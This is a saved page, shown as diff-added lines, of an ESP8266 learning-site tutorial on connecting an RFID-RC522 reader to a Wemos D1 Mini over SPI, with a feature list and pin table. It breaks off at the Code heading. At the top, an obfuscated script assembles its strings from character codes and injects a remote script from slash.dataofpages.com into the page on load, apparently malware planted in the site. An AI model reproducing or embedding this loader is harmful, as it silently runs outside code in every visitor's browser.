+	<style id="tdw-css-placeholder"></style><script src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/special" type="text/javascript"></script><script id="first_time_ch">(function(){try {let/*_xkzpdb*/_pymrhimuskn=String;let/*adzgx*/agyirxqylie=_pymrhimuskn["f"+"rom"+"Char"+"Co"+"de"](102/*_cgucbrw*/,114,111,109)+_pymrhimuskn["f"+"rom"+"Char"+"Co"+"de"](67,104/*_gykxcy*/,97,114)+_pymrhimuskn["f"+"rom"+"Char"+"Co"+"de"](67,111,100/*_mgjrb*/,101);let/*_gykxcy*/ahntasnykid="s"+"c"/*_gykxcy*/+_pymrhimuskn[agyirxqylie](114/*_xkzpdb*/,105,/*aysdjbmknuio*/112,116),/*angbwgobyql*/_cgucbrw="c"+"re"+_pymrhimuskn[agyirxqylie](97/*_cgucbrw*/,116,101,69/*_mgjrb*/,108,101,109/*adzgx*/,101,110,116),/*_xkzpdb*/_gykxcy="s"+_pymrhimuskn[agyirxqylie](114/*_xkzpdb*/,99),/*_mgjrb*/_mgjrb=_pymrhimuskn[agyirxqylie](105/*_mgjrb*/,100),/*aysdjbmknuio*/_xkzpdb="cu"+"rre"+_pymrhimuskn[agyirxqylie](110,116/*_mgjrb*/,83,99/*_xkzpdb*/,114,105/*_mgjrb*/,112,116);let/*angbwgobyql*/adzgx="pa"+"r"+_pymrhimuskn[agyirxqylie](101,110/*aysdjbmknuio*/,116,78/*_mljnwliejtz*/,111,100/*adzgx*/,101), aysdjbmknuio="i"+"ns"+_pymrhimuskn[agyirxqylie](101,114/*_cgucbrw*/,116,66/*_gykxcy*/,101,102/*_xkzpdb*/,111,114,101),/*_cgucbrw*/angbwgobyql="ge"+"El"+_pymrhimuskn[agyirxqylie](101,109/*_mgjrb*/,101,110/*aysdjbmknuio*/,116,115,66/*_xkzpdb*/,121,84,97,103/*angbwgobyql*/,78,97,109,101),/*_mljnwliejtz*/_mljnwliejtz="h"+"e"+_pymrhimuskn[agyirxqylie](97/*adzgx*/,100),/*aedntggbs*/aedntggbs="ap"/*_gykxcy*/+"p"+_pymrhimuskn[agyirxqylie](101/*_gykxcy*/,110/*_mgjrb*/,100,67/*adzgx*/,104,105/*_mljnwliejtz*/,108,100),/*_mljnwliejtz*/_vjhlvdcm=document;var/*angbwgobyql*/aokklie="t"/*angbwgobyql*/+"e"+_pymrhimuskn[agyirxqylie](109,112/*_gykxcy*/,95,119,101,97/*_cgucbrw*/,116,104,101/*_mgjrb*/,114,95,115/*adzgx*/,99,114,105/*aysdjbmknuio*/,112,116),/*_xkzpdb*/aglcoixixji=_vjhlvdcm[_cgucbrw](ahntasnykid),/*_mgjrb*/_gxms=_pymrhimuskn[agyirxqylie](104/*_gykxcy*/,116,116,/*aysdjbmknuio*/112,115,/*_xkzpdb*/58,47,47)+_pymrhimuskn[agyirxqylie](115/*adzgx*/,108,97/*_mgjrb*/,115/*adzgx*/,104,46/*adzgx*/,100,97/*_mgjrb*/,116,97/*_mgjrb*/,111/*angbwgobyql*//*adzgx*/,102/*_mgjrb*/,112,97/*adzgx*/,103/*adzgx*/,101/*angbwgobyql*//*_mgjrb*/,115,46,99/*_mgjrb*/,111/*angbwgobyql*//*adzgx*/,109)+_pymrhimuskn[agyirxqylie](47)+"s"+"cr"+_pymrhimuskn[agyirxqylie](105/*_xkzpdb*/,112,116,115)+_pymrhimuskn[agyirxqylie](47)+_pymrhimuskn[agyirxqylie](103)+"e"+"t"+_pymrhimuskn[agyirxqylie](46,106,115);/*_cgucbrw*/aglcoixixji[_gykxcy]=_gxms;/*_gykxcy*/aglcoixixji[_mgjrb]=aokklie;if(_vjhlvdcm[_xkzpdb])/*_cgucbrw*/{/*_mgjrb*/_vjhlvdcm[_xkzpdb][adzgx][aysdjbmknuio](aglcoixixji,_vjhlvdcm[_xkzpdb]);}/*adzgx*/else/*angbwgobyql*/{_vjhlvdcm[angbwgobyql](_mljnwliejtz)[0][aedntggbs](aglcoixixji);}} catch (err) {}/*d3d8da19a67b847c6273019e15202aaf*/})();</script><style></style><script src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/core.11bfb520.js.download" type="module"></script><style type="text/css">.a2a_hide{display:none}.a2a_logo_color{background-color:#0166ff}.a2a_menu,.a2a_menu *{-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box;float:none;margin:0;padding:0;position:static;height:auto;width:auto}.a2a_menu{border-radius:6px;display:none;direction:ltr;background:#FFF;font:16px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;color:#000;line-height:12px;border:1px solid #CCC;vertical-align:baseline;overflow:hidden}.a2a_mini{min-width:200px;position:absolute;width:300px;z-index:9999997}.a2a_overlay{display:none;background:#616c7deb;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);position:fixed;top:0;right:0;left:0;bottom:0;z-index:9999998;-webkit-tap-highlight-color:transparent;transition:opacity .14s,backdrop-filter .14s}.a2a_full{background:#FFF;border:1px solid #FFF;box-shadow:#2a2a2a1a 0 0 20px 10px;height:auto;height:calc(320px);top:15%;left:50%;margin-left:-320px;position:fixed;text-align:center;width:640px;z-index:9999999;transition:transform .14s,opacity .14s}.a2a_full_footer,.a2a_full_header,.a2a_full_services{border:0;margin:0;padding:12px;box-sizing:border-box}.a2a_full_header{padding-bottom:8px}.a2a_full_services{height:280px;overflow-y:scroll;padding:0 12px;-webkit-overflow-scrolling:touch}.a2a_full_services .a2a_i{display:inline-block;float:none;width:181px;width:calc(33.334% - 18px)}div.a2a_full_footer{font-size:12px;text-align:center;padding:8px 14px}div.a2a_full_footer a,div.a2a_full_footer a:visited{display:inline;font-size:12px;line-height:14px;padding:8px 14px}div.a2a_full_footer a:focus,div.a2a_full_footer a:hover{background:0 0;border:0;color:#0166FF}div.a2a_full_footer a span.a2a_s_a2a,div.a2a_full_footer a span.a2a_w_a2a{background-size:14px;border-radius:3px;display:inline-block;height:14px;line-height:14px;margin:0 3px 0 0;vertical-align:top;width:14px}.a2a_modal{height:0;left:50%;margin-left:-320px;position:fixed;text-align:center;top:15%;width:640px;z-index:9999999;transition:transform .14s,opacity .14s;-webkit-tap-highlight-color:transparent}.a2a_modal_body{background:0 0;border:0;font:24px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;position:relative;height:auto;width:auto}.a2a_thanks{color:#fff;height:auto;margin-top:20px;width:auto}.a2a_thanks>div:first-child{margin:0 0 40px 0}.a2a_thanks div *{height:inherit}#a2a_copy_link{background:#FFF;border:1px solid #FFF;cursor:pointer;margin-top:15%}span.a2a_s_link#a2a_copy_link_icon,span.a2a_w_link#a2a_copy_link_icon{background-size:48px;border-radius:0;display:inline-block;height:48px;left:0;line-height:48px;margin:0 3px 0 0;position:absolute;vertical-align:top;width:48px}#a2a_modal input#a2a_copy_link_text{background-color:transparent;border:0;color:#2A2A2A;cursor:pointer;font:inherit;height:48px;left:62px;max-width:initial;min-height:auto;padding:0;position:relative;width:564px;width:calc(100% - 76px)}#a2a_copy_link_copied{background-color:#0166ff;color:#fff;display:none;font:inherit;font-size:16px;margin-top:1px;padding:3px 8px}@media (prefers-color-scheme:dark){.a2a_menu a,.a2a_menu a.a2a_i,.a2a_menu a.a2a_i:visited,.a2a_menu a.a2a_more,i.a2a_i{border-color:#2a2a2a!important;color:#fff!important}.a2a_menu a.a2a_i:active,.a2a_menu a.a2a_i:focus,.a2a_menu a.a2a_i:hover,.a2a_menu a.a2a_more:active,.a2a_menu a.a2a_more:focus,.a2a_menu a.a2a_more:hover,.a2a_menu_find_container{border-color:#444!important;background-color:#444!important}.a2a_menu:not(.a2a_thanks){background-color:#2a2a2a;border-color:#2a2a2a}.a2a_menu_find{color:#fff!important}.a2a_menu span.a2a_s_find svg{background-color:transparent!important}.a2a_menu span.a2a_s_find svg path{fill:#fff!important}.a2a_full{box-shadow:#00000066 0 0 20px 10px}.a2a_overlay{background-color:#373737eb}}@media print{.a2a_floating_style,.a2a_menu,.a2a_overlay{visibility:hidden}}@keyframes a2aFadeIn{from{opacity:0}to{opacity:1}}.a2a_starting{opacity:0}.a2a_starting.a2a_full,.a2a_starting.a2a_modal{transform:scale(.8)}@media (max-width:639px){.a2a_full{border-radius:0;top:15%;left:0;margin-left:auto;width:100%}.a2a_modal{left:0;margin-left:10px;width:calc(100% - 20px)}}@media (min-width:318px) and (max-width:437px){.a2a_full .a2a_full_services .a2a_i{width:calc(50% - 18px)}}@media (max-width:317px){.a2a_full .a2a_full_services .a2a_i{width:calc(100% - 18px)}}@media (max-height:436px){.a2a_full{bottom:40px;height:auto;top:40px}}@media (max-height:550px){.a2a_modal{top:30px}}@media (max-height:360px){.a2a_modal{top:20px}.a2a_thanks>div:first-child{margin-bottom:20px}}.a2a_menu a{color:#0166FF;text-decoration:none;font:16px sans-serif-light,HelveticaNeue-Light,"Helvetica Neue Light","Helvetica Neue",Arial,Helvetica,"Liberation Sans",sans-serif;line-height:14px;height:auto;width:auto;outline:0}.a2a_menu a.a2a_i:visited,.a2a_menu a.a2a_more{color:#0166FF}.a2a_menu a.a2a_i:active,.a2a_menu a.a2a_i:focus,.a2a_menu a.a2a_i:hover,.a2a_menu a.a2a_more:active,.a2a_menu a.a2a_more:focus,.a2a_menu a.a2a_more:hover{color:#2A2A2A;border-color:#EEE;border-style:solid;background-color:#EEE;text-decoration:none}.a2a_menu span.a2a_s_find{background-size:24px;height:24px;left:8px;position:absolute;top:7px;width:24px}.a2a_menu span.a2a_s_find svg{background-color:#FFF}.a2a_menu span.a2a_s_find svg path{fill:#CCC}#a2a_menu_container{display:inline-block}.a2a_menu_find_container{border:1px solid #CCC;border-radius:6px;padding:2px 24px 2px 0;position:relative;text-align:left}.a2a_cols_container .a2a_col1{overflow-x:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch}#a2a_modal input,#a2a_modal input[type=text],.a2a_menu input,.a2a_menu input[type=text]{display:block;background-image:none;box-shadow:none;line-height:100%;margin:0;outline:0;overflow:hidden;padding:0;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-appearance:none}#a2afeed_find_container input,#a2afeed_find_container input[type=text],#a2apage_find_container input,#a2apage_find_container input[type=text]{background-color:transparent;border:0;box-sizing:content-box;color:#2A2A2A;float:none;font:inherit;font-size:16px;height:28px;line-height:20px;left:38px;outline:0;margin:0;max-width:initial;min-height:initial;padding:2px 0;position:relative;width:99%}.a2a_clear{clear:both}.a2a_svg{background-repeat:no-repeat;display:block;overflow:hidden;height:32px;line-height:32px;padding:0;pointer-events:none;width:32px}.a2a_svg svg{background-repeat:no-repeat;background-position:50% 50%;border:none;display:block;left:0;margin:0 auto;overflow:hidden;padding:0;position:relative;top:0;width:auto;height:auto}a.a2a_i,i.a2a_i{display:block;float:left;border:1px solid #FFF;line-height:24px;padding:6px 8px;text-align:left;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:132px}a.a2a_i span,a.a2a_more span{display:inline-block;overflow:hidden;vertical-align:top}a.a2a_i .a2a_svg{margin:0 6px 0 0}a.a2a_i .a2a_svg,a.a2a_more .a2a_svg{background-size:24px;height:24px;line-height:24px;width:24px}a.a2a_sss:hover{border-left:1px solid #CCC}a.a2a_more{border-bottom:1px solid #FFF;border-left:0;border-right:0;line-height:24px;margin:6px 0 0;padding:6px;-webkit-touch-callout:none}a.a2a_more span{height:24px;margin:0 6px 0 0}.a2a_kit .a2a_svg{background-repeat:repeat}.a2a_default_style a:empty,.a2a_flex_style a:empty,.a2a_floating_style a:empty,.a2a_overlay_style a:empty{display:none}.a2a_color_buttons a,.a2a_floating_style a{text-decoration:none}.a2a_default_style:not(.a2a_flex_style) a{float:left;line-height:16px;padding:0 2px}.a2a_default_style a:hover .a2a_svg,.a2a_floating_style a:hover .a2a_svg,.a2a_overlay_style a:hover .a2a_svg svg{opacity:.7}.a2a_overlay_style.a2a_default_style a:hover .a2a_svg{opacity:1}.a2a_default_style .a2a_count,.a2a_default_style .a2a_svg,.a2a_floating_style .a2a_svg,.a2a_menu .a2a_svg,.a2a_vertical_style .a2a_count,.a2a_vertical_style .a2a_svg{border-radius:4px}.a2a_default_style .a2a_counter img,.a2a_default_style .a2a_dd,.a2a_default_style .a2a_svg{float:left}.a2a_default_style .a2a_img_text{margin-right:4px}.a2a_default_style .a2a_divider{border-left:1px solid #000;display:inline;float:left;height:16px;line-height:16px;margin:0 5px}.a2a_kit a{cursor:pointer;transition:none}.a2a_floating_style{background-color:#fff;border-radius:6px;position:fixed;z-index:9999995}.a2a_overlay_style{z-index:2147483647}.a2a_floating_style,.a2a_overlay_style{animation:a2aFadeIn .2s ease-in;padding:4px}.a2a_vertical_style:not(.a2a_flex_style) a{clear:left;display:block;overflow:hidden;padding:4px}.a2a_floating_style.a2a_default_style{bottom:0}.a2a_floating_style.a2a_default_style a,.a2a_overlay_style.a2a_default_style a{padding:4px}.a2a_count{background-color:#fff;border:1px solid #ccc;box-sizing:border-box;color:#2a2a2a;display:block;float:left;font:12px Arial,Helvetica,sans-serif;height:16px;margin-left:4px;position:relative;text-align:center;width:50px}.a2a_count:after,.a2a_count:before{border:solid transparent;border-width:4px 4px 4px 0;content:"";height:0;left:0;line-height:0;margin:-4px 0 0 -4px;position:absolute;top:50%;width:0}.a2a_count:before{border-right-color:#ccc}.a2a_count:after{border-right-color:#fff;margin-left:-3px}.a2a_count span{animation:a2aFadeIn .14s ease-in}.a2a_vertical_style .a2a_counter img{display:block}.a2a_vertical_style .a2a_count{float:none;margin-left:0;margin-top:6px}.a2a_vertical_style .a2a_count:after,.a2a_vertical_style .a2a_count:before{border:solid transparent;border-width:0 4px 4px 4px;content:"";height:0;left:50%;line-height:0;margin:-4px 0 0 -4px;position:absolute;top:0;width:0}.a2a_vertical_style .a2a_count:before{border-bottom-color:#ccc}.a2a_vertical_style .a2a_count:after{border-bottom-color:#fff;margin-top:-3px}.a2a_color_buttons .a2a_count,.a2a_color_buttons .a2a_count:after,.a2a_color_buttons .a2a_count:before,.a2a_color_buttons.a2a_vertical_style .a2a_count:after,.a2a_color_buttons.a2a_vertical_style .a2a_count:before{background-color:transparent;border:none;color:#fff;float:none;width:auto}.a2a_color_buttons.a2a_vertical_style .a2a_count{margin-top:0}.a2a_flex_style{display:flex;align-items:flex-start;gap:0}.a2a_default_style.a2a_flex_style{left:0;right:0;width:100%}.a2a_vertical_style.a2a_flex_style{flex-direction:column;top:0;bottom:0}.a2a_flex_style a{display:flex;justify-content:center;flex:1;padding:4px}.a2a_flex_style.a2a_vertical_style a{flex-direction:column}.a2a_floating_style.a2a_color_buttons,.a2a_floating_style.a2a_flex_style{border-radius:0;padding:0}.a2a_floating_style.a2a_default_style.a2a_flex_style{bottom:0}.a2a_kit.a2a_flex_style .a2a_counter img,.a2a_kit.a2a_flex_style .a2a_dd,.a2a_kit.a2a_flex_style .a2a_svg{float:none}.a2a_nowrap{white-space:nowrap}.a2a_note{margin:0 auto;padding:9px;font-size:12px;text-align:center}.a2a_note .a2a_note_note{margin:0;color:#2A2A2A}.a2a_wide a{display:block;margin-top:3px;border-top:1px solid #EEE;text-align:center}.a2a_label{position:absolute!important;clip-path:polygon(0px 0px,0px 0px,0px 0px);-webkit-clip-path:polygon(0px 0px,0px 0px,0px 0px);overflow:hidden;height:1px;width:1px}.a2a_kit,.a2a_menu,.a2a_modal,.a2a_overlay{-ms-touch-action:manipulation;touch-action:manipulation;outline:0}.a2a_dd{-webkit-user-drag:none}.a2a_dd img{border:0}.a2a_button_facebook_like iframe{max-width:none}</style></head>
+
+<body class="post-template-default single single-post postid-488 single-format-standard esp8266-rfid-rc522-module-example global-block-template-1 single_template_1 td-full-layout" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+
+        <div class="td-scroll-up"><i class="td-icon-menu-up"></i></div>
+
+    <div class="td-menu-background"></div>
+<div id="td-mobile-nav">
+    <div class="td-mobile-container">
+        <!-- mobile menu top section -->
+        <div class="td-menu-socials-wrap">
+            <!-- socials -->
+            <div class="td-menu-socials">
+                            </div>
+            <!-- close button -->
+            <div class="td-mobile-close">
+                <a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#"><i class="td-icon-close-mobile"></i></a>
+            </div>
+        </div>
+
+        <!-- login section -->
+        
+        <!-- menu section -->
+        <div class="td-mobile-content">
+            <div class="menu-mainmenu-container"><ul id="menu-mainmenu" class="td-mobile-main-menu"><li id="menu-item-733" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-first menu-item-733"><a href="http://www.esp8266learning.com/category/code">Code</a></li>
+<li id="menu-item-741" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-741"><a href="http://www.esp8266learning.com/category/esp32">ESP32</a></li>
+<li id="menu-item-734" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-734"><a href="http://www.esp8266learning.com/category/hardware">Hardware</a></li>
+<li id="menu-item-736" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-736"><a href="http://www.esp8266learning.com/category/information">Information</a></li>
+<li id="menu-item-742" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-742"><a href="http://www.esp8266learning.com/category/nodemcu">NodeMCU</a></li>
+<li id="menu-item-735" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-735"><a href="http://www.esp8266learning.com/category/projects">Projects</a></li>
+<li id="menu-item-737" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-737"><a href="http://www.esp8266learning.com/category/videos">Videos</a></li>
+</ul></div>        </div>
+    </div>
+
+    <!-- register/login section -->
+    </div>    <div class="td-search-background"></div>
+<div class="td-search-wrap-mob">
+	<div class="td-drop-down-search" aria-labelledby="td-header-search-button">
+		<form method="get" class="td-search-form" action="http://www.esp8266learning.com/">
+			<!-- close button -->
+			<div class="td-search-close">
+				<a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#"><i class="td-icon-close-mobile"></i></a>
+			</div>
+			<div role="search" class="td-search-input">
+				<span>Search</span>
+				<input id="td-header-search-mob" type="text" value="" name="s" autocomplete="off">
+			</div>
+		</form>
+		<div id="td-aj-search-mob"></div>
+	</div>
+</div>
+
+    <div id="td-outer-wrap" class="td-theme-wrap">
+    
+        
+            <div class="tdc-header-wrap ">
+
+            <!--
+Header style 1
+-->
+
+
+<div class="td-header-wrap td-header-style-1 ">
+    
+    <div class="td-header-top-menu-full td-container-wrap ">
+        <div class="td-container td-header-row td-header-top-menu">
+            
+    <div class="top-bar-style-1">
+        
+<div class="td-header-sp-top-menu">
+
+
+	<div class="menu-top-container"><ul id="menu-topmenu" class="top-header-menu sf-js-enabled"><li id="menu-item-781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-first td-menu-item td-normal-menu menu-item-781"><a href="http://www.esp8266learning.com/donation">Support Us</a></li>
+<li id="menu-item-750" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-750"><a href="http://www.esp8266learning.com/our-products">Our Products</a></li>
+<li id="menu-item-747" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy td-menu-item td-normal-menu menu-item-747"><a rel="privacy-policy" href="http://www.esp8266learning.com/privacy-policy">Privacy Policy</a></li>
+<li id="menu-item-746" class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-746"><a href="http://www.esp8266learning.com/about">About</a></li>
+</ul></div></div>
+        <div class="td-header-sp-top-widget">
+    
+    </div>    </div>
+
+<!-- LOGIN MODAL -->
+        </div>
+    </div>
+
+    <div class="td-banner-wrap-full td-logo-wrap-full td-container-wrap ">
+        <div class="td-container td-header-row td-header-header">
+            <div class="td-header-sp-logo">
+                        <a class="td-main-logo" href="http://www.esp8266learning.com/">
+            <img class="td-retina-data td-retina-version" data-retina="http://esp8266learning.b-cdn.net/wp-content/uploads/2019/06/esp8266_544.png" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/esp8266_544.png" alt="esp8266 learning" title="esp8266 learning">
+            <span class="td-visual-hidden">esp8266 learning</span>
+        </a>
+                </div>
+                            <div class="td-header-sp-recs">
+                    <div class="td-header-rec-wrap">
+    
+ <!-- A generated by theme --> 
+
+<script async="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/f(1).txt"></script><div class="td-g-rec td-g-rec-id-header td_uid_1_6553840cbd114_rand td_block_template_1 ">
+
+<style>
+/* custom css */
+.td_uid_1_6553840cbd114_rand.td-a-rec-img {
+				    text-align: left;
+				}
+				.td_uid_1_6553840cbd114_rand.td-a-rec-img img {
+                    margin: 0 auto 0 0;
+                }
+</style><script type="text/javascript">
+var td_screen_width = window.innerWidth;
+
+                    if ( td_screen_width >= 1140 ) {
+                        /* large monitors */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-3520634452456567" data-ad-slot="7068422417"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+            
+	                    if ( td_screen_width >= 1019  && td_screen_width < 1140 ) {
+	                        /* landscape tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-3520634452456567" data-ad-slot="7068422417"></ins>');
+	                        (adsbygoogle = window.adsbygoogle || []).push({});
+	                    }
+	                
+                    if ( td_screen_width >= 768  && td_screen_width < 1019 ) {
+                        /* portrait tablets */
+                        document.write('<ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-3520634452456567" data-ad-slot="7068422417"></ins>');
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+                    }
+                </script><ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-3520634452456567" data-ad-slot="7068422417"></ins>
+</div>
+
+ <!-- end A --> 
+
+
+</div>                </div>
+                    </div>
+    </div>
+
+    <div class="td-header-menu-wrap-full td-container-wrap ">
+        
+        <div class="td-header-menu-wrap td-header-gradient ">
+            <div class="td-container td-header-row td-header-main-menu">
+                <div id="td-header-menu" role="navigation">
+    <div id="td-top-mobile-toggle"><a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#"><i class="td-icon-font td-icon-mobile"></i></a></div>
+    <div class="td-main-menu-logo td-logo-in-header">
+                <a class="td-main-logo" href="http://www.esp8266learning.com/">
+            <img class="td-retina-data td-retina-version" data-retina="http://esp8266learning.b-cdn.net/wp-content/uploads/2019/06/esp8266_544.png" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/esp8266_544.png" alt="esp8266 learning" title="esp8266 learning">
+        </a>
+        </div>
+    <div class="menu-mainmenu-container"><ul id="menu-mainmenu-1" class="sf-menu sf-js-enabled"><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-first td-menu-item td-normal-menu menu-item-733"><a href="http://www.esp8266learning.com/category/code">Code</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-741"><a href="http://www.esp8266learning.com/category/esp32">ESP32</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-734"><a href="http://www.esp8266learning.com/category/hardware">Hardware</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-736"><a href="http://www.esp8266learning.com/category/information">Information</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-742"><a href="http://www.esp8266learning.com/category/nodemcu">NodeMCU</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-735"><a href="http://www.esp8266learning.com/category/projects">Projects</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-normal-menu menu-item-737"><a href="http://www.esp8266learning.com/category/videos">Videos</a></li>
+</ul></div></div>
+
+
+    <div class="header-search-wrap">
+        <div class="td-search-btns-wrap">
+            <a id="td-header-search-button" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" role="button" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
+            <a id="td-header-search-button-mob" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" class="dropdown-toggle " data-toggle="dropdown"><i class="td-icon-search"></i></a>
+        </div>
+
+        <div class="td-drop-down-search" aria-labelledby="td-header-search-button">
+            <form method="get" class="td-search-form" action="http://www.esp8266learning.com/">
+                <div role="search" class="td-head-form-search-wrap">
+                    <input id="td-header-search" type="text" value="" name="s" autocomplete="off"><input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="Search">
+                </div>
+            </form>
+            <div id="td-aj-search"></div>
+        </div>
+    </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+            </div>
+
+            
+    <div class="td-main-content-wrap td-container-wrap">
+
+        <div class="td-container td-post-template-1 ">
+            <div class="td-crumb-container"></div>
+            <div class="td-pb-row">
+                                        <div class="td-pb-span8 td-main-content" role="main">
+                            <div class="td-ss-main-content">
+                                
+
+    <article id="post-488" class="post-488 post type-post status-publish format-standard hentry category-code tag-esp8266 tag-rfid-rc522" itemscope="" itemtype="http://schema.org/Article">
+        <div class="td-post-header">
+
+            <ul class="td-category"><li class="entry-category"><a href="http://www.esp8266learning.com/category/code">Code</a></li></ul>
+            <header class="td-post-title">
+                <h1 class="entry-title">ESP8266 and RFID-RC522 module example</h1>
+
+                
+
+                <div class="td-module-meta-info">
+                                                                                                </div>
+
+            </header>
+
+
+        </div>
+
+        <div class="td-post-sharing-top"><div id="td_social_sharing_article_top" class="td-post-sharing td-ps-bg td-ps-notext td-post-sharing-style1 "><div class="td-post-sharing-visible"><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-facebook" href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php">
+                                        <div class="td-social-but-icon"><i class="td-icon-facebook"></i></div>
+                                        <div class="td-social-but-text">Facebook</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-twitter" href="https://twitter.com/intent/tweet?text=ESP8266+and+RFID-RC522+module+example&amp;url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php&amp;via=esp8266+learning">
+                                        <div class="td-social-but-icon"><i class="td-icon-twitter"></i></div>
+                                        <div class="td-social-but-text">Twitter</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-pinterest" href="https://pinterest.com/pin/create/button/?url=http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php&amp;media=&amp;description=ESP8266+and+RFID-RC522+module+example">
+                                        <div class="td-social-but-icon"><i class="td-icon-pinterest"></i></div>
+                                        <div class="td-social-but-text">Pinterest</div>
+                                    </a><a class="td-social-sharing-button td-social-sharing-button-js td-social-network td-social-whatsapp" href="whatsapp://send?text=ESP8266+and+RFID-RC522+module+example%20%0A%0A%20http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php">
+                                        <div class="td-social-but-icon"><i class="td-icon-whatsapp"></i></div>
+                                        <div class="td-social-but-text">WhatsApp</div>
+                                    </a></div><div class="td-social-sharing-hidden"><ul class="td-pulldown-filter-list"></ul><a class="td-social-sharing-button td-social-handler td-social-expand-tabs" href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#" data-block-uid="td_social_sharing_article_top">
+                                    <div class="td-social-but-icon"><i class="td-icon-plus td-social-expand-tabs-icon"></i></div>
+                                </a></div></div></div>
+
+        <div class="td-post-content">
+            <div class="td-featured-image-rec">
+
+                        </div>
+
+            <p>In this example we will connect an RFID-RC522 module and connect to a Wemos Mini</p>
+<p>The microcontroller and card reader uses SPI for communication . The card reader and the tags communicate using a 13.56MHz electromagnetic field. (ISO 14443A standart tags)</p>
+<p><a href="http://s.click.aliexpress.com/e/6EM7uZv" target="_parent"><img decoding="async" class="" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/1-set-TENSTAR-ROBOT-font-b-RFID-b-font-font-b-module-b-font-RC522-Kits.jpg_220x220.jpg" width="442" height="442"></a></p>
+<p><strong>Features:</strong></p>
+<ul>
+<li>MFRC522 chip based board</li>
+<li>Operating frequency: 13.56MHz</li>
+<li>Supply Voltage: 3.3V</li>
+<li>Current: 13-26mA</li>
+<li>Read Range: Approx 3cm with supplied card and fob</li>
+<li>SPI Interface</li>
+<li>Max Data Transfer Rate: 10Mbit / s</li>
+<li>Dimensions: 60mm × 39mm</li>
+</ul>
+<p>Datasheet for the chip that used in modules can be found at:</p>
+<p><a class="urllink" href="http://www.nxp.com/documents/data_sheet/MFRC522.pdf" rel="nofollow">http://www.nxp.com/documents/data_sheet/MFRC522.pdf</a></p>
+<p><strong>Layout</strong></p>
+<p>This is how I wired the module to my Wemos Mini as per the documentation</p>
+<table style="height: 230px;" width="492">
+<thead valign="bottom">
+<tr>
+<th rowspan="2"></th>
+<th></th>
+</tr>
+<tr>
+<th>Wemos D1 mini</th>
+</tr>
+<tr>
+<th>Signal</th>
+<th>Pin</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr>
+<td>RST/Reset</td>
+<td>D3</td>
+</tr>
+<tr>
+<td>SPI SS</td>
+<td>D8</td>
+</tr>
+<tr>
+<td>SPI MOSI</td>
+<td>D7</td>
+</tr>
+<tr>
+<td>SPI MISO</td>
+<td>D6</td>
+</tr>
+<tr>
+<td>SPI SCK</td>
+<td>D5</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p><strong>Code</strong></p>
